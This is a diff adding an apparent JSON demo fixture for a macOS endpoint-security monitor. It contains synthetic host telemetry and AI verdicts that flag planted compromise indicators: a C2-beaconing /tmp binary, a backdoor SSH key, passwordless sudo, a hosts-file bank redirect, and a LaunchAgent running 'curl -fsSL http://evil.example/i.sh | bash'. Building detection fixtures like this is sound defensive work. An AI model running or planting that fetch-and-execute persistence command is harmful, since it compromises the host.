@@ -1,0 +1,1723 @@
+{
+  "rows": [
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-6",
+        "started_at": "$run_start:6",
+        "finished_at": "$run_end:6",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-5",
+        "started_at": "$run_start:5",
+        "finished_at": "$run_end:5",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-4",
+        "started_at": "$run_start:4",
+        "finished_at": "$run_end:4",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-3",
+        "started_at": "$run_start:3",
+        "finished_at": "$run_end:3",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-2",
+        "started_at": "$run_start:2",
+        "finished_at": "$run_end:2",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "CollectionRun",
+      "fields": {
+        "run_id": "run-1",
+        "started_at": "$run_start:1",
+        "finished_at": "$run_end:1",
+        "hostname": "demo-host.local",
+        "collectors_ok": 24,
+        "collectors_failed": 1,
+        "lookback_min": 6
+      }
+    },
+    {
+      "model": "ProcessRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "p_chrome",
+        "pid": 501,
+        "ppid": 1,
+        "name": "Google Chrome",
+        "exe": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+        "username": "iklo",
+        "cpu_percent": 3.4,
+        "memory_rss": 820000000,
+        "num_threads": 42
+      }
+    },
+    {
+      "model": "ProcessRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "p_evil",
+        "pid": 66610,
+        "ppid": 931,
+        "name": "x",
+        "exe": "/tmp/.x",
+        "cmdline_json": [
+          "/tmp/.x",
+          "-d"
+        ],
+        "username": "iklo",
+        "cpu_percent": 22.1,
+        "memory_rss": 4000000,
+        "num_threads": 3
+      }
+    },
+    {
+      "model": "ProcessRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "p_ssh",
+        "pid": 720,
+        "ppid": 1,
+        "name": "sshd",
+        "exe": "/usr/sbin/sshd",
+        "username": "root",
+        "cpu_percent": 0.0,
+        "memory_rss": 6000000
+      }
+    },
+    {
+      "model": "ProcessRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "pid": 1,
+        "ppid": 0,
+        "name": "launchd",
+        "exe": "/sbin/launchd",
+        "username": "root"
+      }
+    },
+    {
+      "model": "NetworkConnectionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "pid": 501,
+        "family": "AF_INET",
+        "type": "SOCK_STREAM",
+        "laddr_ip": "192.168.1.20",
+        "laddr_port": 51020,
+        "raddr_ip": "142.250.80.46",
+        "raddr_port": 443,
+        "status": "ESTABLISHED"
+      }
+    },
+    {
+      "model": "NetworkConnectionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "nc_evil",
+        "pid": 66610,
+        "family": "AF_INET",
+        "type": "SOCK_STREAM",
+        "laddr_ip": "192.168.1.20",
+        "laddr_port": 51999,
+        "raddr_ip": "9.9.9.9",
+        "raddr_port": 443,
+        "status": "ESTABLISHED"
+      }
+    },
+    {
+      "model": "ListeningPortRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "lp_evil",
+        "pid": 66610,
+        "process_name": "x",
+        "family": "AF_INET",
+        "type": "SOCK_STREAM",
+        "laddr_ip": "0.0.0.0",
+        "laddr_port": 4444
+      }
+    },
+    {
+      "model": "ListeningPortRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "pid": 720,
+        "process_name": "sshd",
+        "family": "AF_INET",
+        "type": "SOCK_STREAM",
+        "laddr_ip": "0.0.0.0",
+        "laddr_port": 22
+      }
+    },
+    {
+      "model": "NetworkFlowRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "nf_evil",
+        "iface": "en0",
+        "proto": "tcp",
+        "dst_ip": "9.9.9.9",
+        "dst_port": 443,
+        "service": "https",
+        "packets": 120,
+        "byte_count": 18000,
+        "process": "x",
+        "pid": 66610,
+        "first_seen": "$run_start:1",
+        "last_seen": "$run_start:1"
+      }
+    },
+    {
+      "model": "NetworkFlowRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "iface": "en0",
+        "proto": "tcp",
+        "dst_ip": "142.250.80.46",
+        "dst_port": 443,
+        "service": "https",
+        "packets": 8400,
+        "byte_count": 9200000,
+        "process": "Google Chrome",
+        "pid": 501,
+        "first_seen": "$run_start:1",
+        "last_seen": "$run_start:1"
+      }
+    },
+    {
+      "model": "DnsQueryRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "dns_evil",
+        "iface": "en0",
+        "qname": "c2-sync.example",
+        "qtype": "A",
+        "server_ip": "192.168.1.1",
+        "process": "x",
+        "count": 37,
+        "first_seen": "$run_start:1",
+        "last_seen": "$run_start:1"
+      }
+    },
+    {
+      "model": "DnsQueryRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "iface": "en0",
+        "qname": "www.google.com",
+        "qtype": "A",
+        "server_ip": "192.168.1.1",
+        "process": "Google Chrome",
+        "count": 12,
+        "first_seen": "$run_start:1",
+        "last_seen": "$run_start:1"
+      }
+    },
+    {
+      "model": "NetworkInterfaceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "name": "en0",
+        "is_up": true,
+        "speed_mbps": 1000,
+        "mtu": 1500,
+        "bytes_sent": 8300000000,
+        "bytes_recv": 42000000000,
+        "packets_sent": 21000000,
+        "packets_recv": 33000000,
+        "addresses_json": [
+          "192.168.1.20",
+          "fe80::1"
+        ]
+      }
+    },
+    {
+      "model": "NetworkInterfaceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "name": "lo0",
+        "is_up": true,
+        "mtu": 16384,
+        "addresses_json": [
+          "127.0.0.1",
+          "::1"
+        ]
+      }
+    },
+    {
+      "model": "UsbDeviceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "name": "USB Keyboard",
+        "vendor_id": "05ac",
+        "product_id": "024f",
+        "manufacturer": "Apple Inc.",
+        "speed": "Low Speed"
+      }
+    },
+    {
+      "model": "UsbDeviceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "usb_susp",
+        "name": "USB Mass Storage",
+        "vendor_id": "0781",
+        "product_id": "5567",
+        "manufacturer": "SanDisk",
+        "serial_number": "4C530001",
+        "speed": "High Speed"
+      }
+    },
+    {
+      "model": "BluetoothDeviceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "name": "Magic Mouse",
+        "address": "a4:83:e7:11:22:33",
+        "connected": true,
+        "paired": true,
+        "minor_type": "Mouse"
+      }
+    },
+    {
+      "model": "BluetoothDeviceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "bt_susp",
+        "name": "rafaela frare",
+        "address": "00:1a:7d:da:71:13",
+        "connected": false,
+        "paired": true,
+        "minor_type": "Keyboard"
+      }
+    },
+    {
+      "model": "WifiStateRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "interface": "en0",
+        "ssid": "HomeNet",
+        "bssid": "b4:fb:e4:aa:bb:cc",
+        "channel": 44,
+        "security": "WPA2 Personal"
+      }
+    },
+    {
+      "model": "LaunchItemRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "li_evil",
+        "scope": "user_agent",
+        "path": "$home:Library/LaunchAgents/com.evil.persist.plist",
+        "label": "com.evil.persist",
+        "program": "/bin/bash",
+        "program_arguments_json": [
+          "/bin/bash",
+          "-c",
+          "curl -fsSL http://evil.example/i.sh | bash"
+        ],
+        "run_at_load": true,
+        "keep_alive": true,
+        "user_name": "iklo"
+      }
+    },
+    {
+      "model": "LaunchItemRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "scope": "system_daemon",
+        "path": "/Library/LaunchDaemons/com.apple.x.plist",
+        "label": "com.apple.x",
+        "program": "/usr/libexec/x",
+        "run_at_load": true
+      }
+    },
+    {
+      "model": "QuarantineEventRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "q_susp",
+        "event_id": "A1B2",
+        "timestamp": 1717000000.0,
+        "agent_bundle_id": "com.apple.Safari",
+        "agent_name": "Safari",
+        "origin_url": "http://free-downloads.example/installer.dmg",
+        "data_url": "http://cdn.example/installer.dmg",
+        "type_number": 0
+      }
+    },
+    {
+      "model": "BrowserExtensionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "be_susp",
+        "browser": "chrome",
+        "profile": "Default",
+        "extension_id": "aaaabbbbccccddddeeeeffff",
+        "name": "Coupon Saver",
+        "version": "3.1",
+        "permissions_json": [
+          "tabs",
+          "webRequest",
+          "cookies",
+          "<all_urls>"
+        ],
+        "host_permissions_json": [
+          "<all_urls>"
+        ]
+      }
+    },
+    {
+      "model": "BrowserExtensionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "browser": "chrome",
+        "profile": "Default",
+        "extension_id": "cjpalhdlnbpafiamejdnhcphjbkeiagm",
+        "name": "uBlock Origin",
+        "version": "1.57",
+        "permissions_json": [
+          "storage"
+        ]
+      }
+    },
+    {
+      "model": "SystemIntegrityRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "filevault_active": true,
+        "firewall_global_state": 0,
+        "firewall_stealth": false,
+        "gatekeeper_assessments_enabled": true,
+        "remote_login_enabled": true,
+        "screen_sharing_enabled": false,
+        "remote_management_enabled": false
+      }
+    },
+    {
+      "model": "FileIntegrityRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "fi_susp",
+        "path": "$home:.zshrc",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "size": 4200,
+        "mode": 420,
+        "uid": 501,
+        "gid": 20,
+        "exists_flag": 1
+      }
+    },
+    {
+      "model": "FileIntegrityRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "path": "/etc/ssh/sshd_config",
+        "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "size": 3200,
+        "mode": 420,
+        "uid": 0,
+        "gid": 0,
+        "exists_flag": 1
+      }
+    },
+    {
+      "model": "InstalledAppRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "path": "/Applications/Google Chrome.app",
+        "bundle_id": "com.google.Chrome",
+        "name": "Google Chrome",
+        "version": "120.0.6099"
+      }
+    },
+    {
+      "model": "InstalledAppRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "path": "/usr/bin/openssl",
+        "bundle_id": "org.openssl",
+        "name": "openssl",
+        "version": "3.0.2"
+      }
+    },
+    {
+      "model": "InstalledAppRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "path": "/usr/bin/curl",
+        "name": "libcurl",
+        "version": "7.88.0"
+      }
+    },
+    {
+      "model": "ProcessExecRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "px_evil",
+        "event_timestamp": "$run_start:1",
+        "event_type": "exec",
+        "pid": 66610,
+        "ppid": 931,
+        "uid": 501,
+        "username": "iklo",
+        "exe_path": "/tmp/.x",
+        "exe_args_json": [
+          "/tmp/.x",
+          "-d"
+        ],
+        "parent_path": "/bin/zsh",
+        "signing_id": null
+      }
+    },
+    {
+      "model": "ProcessExecRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "event_timestamp": "$run_start:1",
+        "event_type": "exec",
+        "pid": 940,
+        "ppid": 1,
+        "uid": 0,
+        "username": "root",
+        "exe_path": "/usr/sbin/cron",
+        "parent_path": "/sbin/launchd",
+        "signing_id": "com.apple.cron"
+      }
+    },
+    {
+      "model": "MountRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "device": "/dev/disk3s1s1",
+        "mountpoint": "/",
+        "fstype": "apfs",
+        "opts": "ro,journaled"
+      }
+    },
+    {
+      "model": "MountRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "device": "/dev/disk3s5",
+        "mountpoint": "/System/Volumes/Data",
+        "fstype": "apfs",
+        "opts": "rw,journaled"
+      }
+    },
+    {
+      "model": "SetuidFileRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "path": "/usr/bin/sudo",
+        "mode": 2413,
+        "uid": 0,
+        "gid": 0,
+        "size": 1400000,
+        "setuid": true,
+        "setgid": false,
+        "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
+      }
+    },
+    {
+      "model": "SetuidFileRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "su_susp",
+        "path": "/usr/local/bin/helper",
+        "mode": 2541,
+        "uid": 0,
+        "gid": 0,
+        "size": 22000,
+        "setuid": true,
+        "setgid": false,
+        "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+      }
+    },
+    {
+      "model": "MdmProfileRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "identifier": "com.example.mdm",
+        "display_name": "Corp MDM",
+        "organization": "Example Corp",
+        "profile_scope": "System",
+        "is_supervised": true
+      }
+    },
+    {
+      "model": "KernelExtensionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "bundle_id": "com.apple.iokit.IOHIDFamily",
+        "name": "IOHIDFamily",
+        "version": "2.0.0",
+        "path": "/System/Library/Extensions",
+        "team_id": null,
+        "signing_id": "com.apple.iokit.IOHIDFamily"
+      }
+    },
+    {
+      "model": "SystemExtensionRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "bundle_id": "com.cloudflare.warp.extension",
+        "team_id": "68WVV388M8",
+        "version": "2024.1",
+        "state": "activated_enabled",
+        "categories": "network-extension"
+      }
+    },
+    {
+      "model": "SshAuthorizedKeyRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "ssh_susp",
+        "path": "$home:.ssh/authorized_keys",
+        "owner": "iklo",
+        "key_type": "ssh-ed25519",
+        "fingerprint": "SHA256:Zk3...",
+        "comment": "root@kali"
+      }
+    },
+    {
+      "model": "HostsFileRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "hosts_susp",
+        "source_path": "/etc/hosts",
+        "ip": "127.0.0.1",
+        "hostnames": "login.bank-of-example.com"
+      }
+    },
+    {
+      "model": "HostsFileRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "source_path": "/etc/hosts",
+        "ip": "127.0.0.1",
+        "hostnames": "localhost"
+      }
+    },
+    {
+      "model": "PrivilegeConfigRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "priv_susp",
+        "kind": "sudoers",
+        "subject": "iklo",
+        "detail": "iklo ALL=(ALL) NOPASSWD: ALL",
+        "source_path": "/etc/sudoers.d/iklo"
+      }
+    },
+    {
+      "model": "PrivilegeConfigRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "kind": "account",
+        "subject": "root",
+        "detail": "uid=0",
+        "source_path": "/etc/passwd"
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-6",
+        "collected_at": "$run_start:6",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 60.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          40,
+          57,
+          74,
+          91,
+          53,
+          70,
+          87,
+          49,
+          66,
+          83,
+          45,
+          62,
+          79,
+          41,
+          58,
+          75
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-5",
+        "collected_at": "$run_start:5",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 64.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          51,
+          68,
+          85,
+          47,
+          64,
+          81,
+          43,
+          60,
+          77,
+          94,
+          56,
+          73,
+          90,
+          52,
+          69,
+          86
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-4",
+        "collected_at": "$run_start:4",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 70.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          62,
+          79,
+          41,
+          58,
+          75,
+          92,
+          54,
+          71,
+          88,
+          50,
+          67,
+          84,
+          46,
+          63,
+          80,
+          42
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-3",
+        "collected_at": "$run_start:3",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 66.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          73,
+          90,
+          52,
+          69,
+          86,
+          48,
+          65,
+          82,
+          44,
+          61,
+          78,
+          40,
+          57,
+          74,
+          91,
+          53
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-2",
+        "collected_at": "$run_start:2",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 72.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          84,
+          46,
+          63,
+          80,
+          42,
+          59,
+          76,
+          93,
+          55,
+          72,
+          89,
+          51,
+          68,
+          85,
+          47,
+          64
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "HostResourceRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "mem_total": 68719476736,
+        "mem_used": 34359738368,
+        "mem_available": 34359738368,
+        "mem_free": 13743895347,
+        "mem_percent": 50.0,
+        "swap_total": 2147483648,
+        "swap_used": 1009317314,
+        "swap_free": 1138166333,
+        "swap_percent": 47.0,
+        "cpu_percent": 68.0,
+        "cpu_count_logical": 16,
+        "cpu_count_physical": 8,
+        "cpu_per_core_json": [
+          40,
+          57,
+          74,
+          91,
+          53,
+          70,
+          87,
+          49,
+          66,
+          83,
+          45,
+          62,
+          79,
+          41,
+          58,
+          75
+        ],
+        "load_1": 4.66,
+        "load_5": 5.66,
+        "load_15": 5.27,
+        "uptime_seconds": 1400000,
+        "tasks_total": 789,
+        "tasks_running": 4,
+        "threads_total": 3881
+      }
+    },
+    {
+      "model": "DiskUsageRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "device": "/dev/disk3s1s1",
+        "mountpoint": "/",
+        "fstype": "apfs",
+        "total": 1067299373056,
+        "used": 405573761761,
+        "free": 661725611294,
+        "percent": 38.0
+      }
+    },
+    {
+      "model": "DiskUsageRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "disk_data",
+        "device": "/dev/disk3s5",
+        "mountpoint": "/System/Volumes/Data",
+        "fstype": "apfs",
+        "total": 1067299373056,
+        "used": 608360642641,
+        "free": 458938730414,
+        "percent": 57.0
+      }
+    },
+    {
+      "model": "DiskUsageRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "disk_backup",
+        "device": "/dev/disk4s1",
+        "mountpoint": "/Volumes/Backup",
+        "fstype": "hfs",
+        "total": 536870912000,
+        "used": 520764784640,
+        "free": 16106127360,
+        "percent": 97.0
+      }
+    },
+    {
+      "model": "YaraStatusRow",
+      "fields": {
+        "id": 1,
+        "compiled_at": "$run_start:1",
+        "rules_loaded": 5292,
+        "files_loaded": 656,
+        "files_skipped": 95,
+        "rules_dir": "/opt/avai/yara",
+        "sources_json": {
+          "bundled": 1,
+          "signature-base": 655
+        },
+        "skip_reasons_json": {
+          "needs crypto-enabled yara": 82,
+          "other": 13
+        },
+        "by_category_json": {
+          "apt": 260,
+          "gen": 156,
+          "crime": 76,
+          "mal": 46,
+          "exploit": 31,
+          "vuln": 22,
+          "hacktool": 10,
+          "suspicious": 8,
+          "webshell": 7,
+          "ransomware": 6,
+          "generic": 4,
+          "cn": 3
+        }
+      }
+    },
+    {
+      "model": "FileScanRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "fs_eicar",
+        "path": "$home:Downloads/eicar.com",
+        "rule": "eicar_test_file",
+        "namespace": "bundled",
+        "scan_source": "user_dirs",
+        "sha256": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+        "size": 68,
+        "meta_json": {
+          "author": "avai",
+          "description": "EICAR antivirus test string"
+        }
+      }
+    },
+    {
+      "model": "FileScanRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": "fs_hacktool",
+        "path": "/usr/local/bin/masscan",
+        "rule": "hacktool_multi_masscan",
+        "namespace": "signature-base",
+        "scan_source": "bin_dirs",
+        "sha256": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+        "size": 2400000,
+        "meta_json": {
+          "author": "@mimeframe",
+          "description": "Masscan mass IP port scanner"
+        }
+      }
+    },
+    {
+      "model": "AuthEventRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "event_timestamp": "$run_start:1",
+        "process": "sudo",
+        "subsystem": "com.apple.securityd",
+        "category": "auth",
+        "event_type": "failure",
+        "event_message": "authentication failure for iklo",
+        "pid": 940
+      }
+    },
+    {
+      "model": "AuthEventRow",
+      "fields": {
+        "run_id": "run-1",
+        "collected_at": "$run_start:1",
+        "content_hash": null,
+        "event_timestamp": "$run_start:1",
+        "process": "sshd",
+        "subsystem": "com.apple.securityd",
+        "category": "auth",
+        "event_type": "failure",
+        "event_message": "Failed password for invalid user admin",
+        "pid": 720
+      }
+    },
+    {
+      "model": "StreamingSession",
+      "fields": {
+        "run_id": "sess-auth",
+        "collector": "auth_events",
+        "hostname": "demo-host.local",
+        "started_at": "$run_start:1",
+        "finished_at": null,
+        "row_count": 574
+      }
+    },
+    {
+      "model": "StreamingSession",
+      "fields": {
+        "run_id": "sess-exec",
+        "collector": "process_exec_events",
+        "hostname": "demo-host.local",
+        "started_at": "$run_start:1",
+        "finished_at": null,
+        "row_count": 88
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "p_evil",
+        "collector": "processes",
+        "verdict": "malicious",
+        "category": "execution",
+        "confidence": 0.94,
+        "reasoning": "Unsigned binary in /tmp with high CPU, beaconing to a flagged IP.",
+        "remediation": "Kill pid 66610; rm /tmp/.x; investigate parent shell.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": 1,
+        "context_json": {
+          "baseline": {
+            "novel": true,
+            "first_seen": "$run_start:1",
+            "times_seen": 1,
+            "host_runs": 6,
+            "baseline_established": true
+          },
+          "related": {
+            "listening_ports": [
+              "0.0.0.0:4444"
+            ],
+            "outbound_flows": [
+              {
+                "dst": "9.9.9.9:443",
+                "service": "https",
+                "packets": 120
+              }
+            ],
+            "remote_connections": [
+              "9.9.9.9:443 ESTABLISHED"
+            ],
+            "dns_queries": [
+              "c2-sync.example (A)"
+            ],
+            "exec_lineage": {
+              "parent": "/bin/zsh",
+              "signed": null,
+              "exe": "/tmp/.x"
+            }
+          }
+        },
+        "cost_usd": 0.00021
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "p_chrome",
+        "collector": "processes",
+        "verdict": "benign",
+        "category": "none",
+        "confidence": 0.98,
+        "reasoning": "Signed mainstream browser.",
+        "remediation": "",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 9e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "li_evil",
+        "collector": "launch_items",
+        "verdict": "malicious",
+        "category": "persistence",
+        "confidence": 0.92,
+        "reasoning": "LaunchAgent runs curl|bash at load — classic persistence.",
+        "remediation": "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist; delete the plist.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": 1,
+        "context_json": null,
+        "cost_usd": 0.00015
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "nf_evil",
+        "collector": "network_flows",
+        "verdict": "suspicious",
+        "category": "command_and_control",
+        "confidence": 0.8,
+        "reasoning": "Steady low-volume beacon to 9.9.9.9:443 from /tmp binary.",
+        "remediation": "Block 9.9.9.9; correlate with pid 66610.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 0.00011
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "dns_evil",
+        "collector": "dns_queries",
+        "verdict": "malicious",
+        "category": "command_and_control",
+        "confidence": 0.85,
+        "reasoning": "Repeated lookups of c2-sync.example (likely C2).",
+        "remediation": "Sinkhole the domain; inspect the querying process.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 0.0001
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "lp_evil",
+        "collector": "listening_ports",
